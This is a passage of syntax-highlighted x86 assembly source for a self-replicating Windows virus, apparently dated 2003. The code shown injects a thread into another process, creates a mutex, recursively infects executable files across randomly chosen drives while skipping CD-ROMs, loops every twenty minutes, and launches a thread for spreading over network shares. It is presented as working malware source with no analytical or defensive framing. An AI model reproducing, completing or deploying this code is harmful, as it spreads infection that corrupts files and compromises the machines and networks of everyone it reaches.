    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">GetWindowThreadProcessId</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_thread1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;efork(pid, paddr, icaddr, ofs, ics, hwnd, thid)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">thread2</span><span class="sc4">-</span><span class="sc5">virstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virstart</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">efork</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_thread1</span><span class="sc0">

    </span><span class="sc1">; run local thread if we can not run remote one</span><span class="sc0">
</span><span class="sc5">run_local_thread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">thread2</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">exit_thread1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0"> </span><span class="sc1">; wait while thread copies itself to stack</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">    </span><span class="sc1">; exit</span><span class="sc0">


</span><span class="sc1">; stack variables</span><span class="sc0">

</span><span class="sc5">valuessize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc1">; local stack values size</span><span class="sc0">
</span><span class="sc1">; variables begin at ebp-8</span><span class="sc0">
</span><span class="sc5">_thid</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">_hwnd</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">fdata</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">150h</span><span class="sc0">
</span><span class="sc5">ahand</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">154h</span><span class="sc0">  
</span><span class="sc5">hmap</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">158h</span><span class="sc0">
</span><span class="sc5">fbase</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">15Ch</span><span class="sc0">
</span><span class="sc5">rvaalloc</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">160h</span><span class="sc0">
</span><span class="sc5">i</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">164h</span><span class="sc0">
</span><span class="sc5">fsize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">168h</span><span class="sc0">
</span><span class="sc5">newfsize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">16Ch</span><span class="sc0">
</span><span class="sc5">fpos</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">170h</span><span class="sc0">
</span><span class="sc5">rvapos</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">174h</span><span class="sc0">
</span><span class="sc5">loaderbuf</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">178h</span><span class="sc0">  </span><span class="sc1">; pointer to loader buffer </span><span class="sc0">
</span><span class="sc5">virbuf</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">17Ch</span><span class="sc0">  </span><span class="sc1">; pointer to virus buffer </span><span class="sc0">
</span><span class="sc5">hmap</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">180h</span><span class="sc0">
</span><span class="sc5">tbl</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">184h</span><span class="sc0">
</span><span class="sc5">jmpofs</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">188h</span><span class="sc0">
</span><span class="sc5">injofs</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">18Ch</span><span class="sc0">
</span><span class="sc5">loaderphysaddr</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">190h</span><span class="sc0">
</span><span class="sc5">newimagesize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">194h</span><span class="sc0">
</span><span class="sc5">newsectionvirtsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">198h</span><span class="sc0">
</span><span class="sc5">newsectionphyssize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">19Ch</span><span class="sc0">
</span><span class="sc5">diffaddr</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1A0h</span><span class="sc0">
</span><span class="sc5">codesegphysaddr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1A4h</span><span class="sc0">
</span><span class="sc5">enchash</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1A8h</span><span class="sc0">
</span><span class="sc5">hfind</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1ACh</span><span class="sc0">
</span><span class="sc5">tempdir</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">2B0h</span><span class="sc0">
</span><span class="sc5">tempdirl</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3B0h</span><span class="sc0">
</span><span class="sc5">firstinf</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3B4h</span><span class="sc0">
</span><span class="sc5">countinfect</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3B8h</span><span class="sc0">
</span><span class="sc5">level</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3BCh</span><span class="sc0">  </span><span class="sc1">; recursion level</span><span class="sc0">
</span><span class="sc5">dsk</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3CCh</span><span class="sc0">
</span><span class="sc5">infected</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3D0h</span><span class="sc0">
</span><span class="sc5">jmpflag</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3D4h</span><span class="sc0">

</span><span class="sc1">;***  thread2 - main thread</span><span class="sc0">
    </span><span class="sc5">copy_to_stack</span><span class="sc0"> </span><span class="sc5">thread2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stack_exec</span><span class="sc0">

</span><span class="sc5">stack_exec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">valuessize</span><span class="sc0">

</span><span class="sc5">createm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mutexname</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">CreateMutex</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmutex</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">halt</span><span class="sc0">

    </span><span class="sc1">; set work mode </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setmode</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">initthread</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_init</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__76786</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Nastena Perelett 2003"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">__76786</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;   call _cout</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">SetConsoleTitleA</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

    </span><span class="sc1">; run net infection thread</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">thread3</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">NORELEASE</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dsk</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'\:c'</span><span class="sc1">;'.'</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">RELEASE</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dsk</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">   

    </span><span class="sc1">; recursion level</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">level</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc1">; inf count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">countinfect</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dsk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stsize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recinf</span><span class="sc0">
    </span><span class="sc1">; recinf checks infection count</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stsize</span><span class="sc0">

</span><span class="sc5">main_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; set work mode </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setmode</span><span class="sc0">

    </span><span class="sc1">; fuck disk files</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dsk</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'\:c'</span><span class="sc0">
    </span><span class="sc1">; change disk several times</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">diskch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">look</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">rdtsc</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">63h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dsk</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dsk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">look</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_cd</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">nextdsk</span><span class="sc0">
    
    </span><span class="sc1">; recursion level</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">level</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc1">; inf count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">countinfect</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dsk</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stsize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recinf</span><span class="sc0">
    </span><span class="sc1">; recinf checks infection count</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stsize</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">nextdsk</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">diskch</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">*</span><span class="sc2">60000</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">     
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">main_loop</span><span class="sc0">
    
</span><span class="sc5">vir_exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; release mutex</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmutex</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">ReleaseMutex</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmutex</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">vir_exit2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; free memory </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tbl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_vfree</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loaderbuf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_vfree</span><span class="sc0">
</span><span class="sc5">halt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; exit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">

</span><span class="sc1">; CD-ROM check</span><span class="sc0">
</span><span class="sc5">check_cd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_6563</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"l0x"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_6563</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">CreateDirectoryA</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_cd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_6564</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"l0x"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_6564</span><span class="sc4">:</span><span class="sc0">          
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">RemoveDirectoryA</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_cd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; *** thread3 - net infection</span><span class="sc0">
    </span><span class="sc5">copy_to_stack</span><span class="sc0"> </span><span class="sc5">thread3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_stack_exec3</span><span class="sc0">

</span><span class="sc5">_stack_exec3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">valuessize</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">initthread</span><span class="sc0">

</span><span class="sc5">__mpr</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_WNetOpenEnumA</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
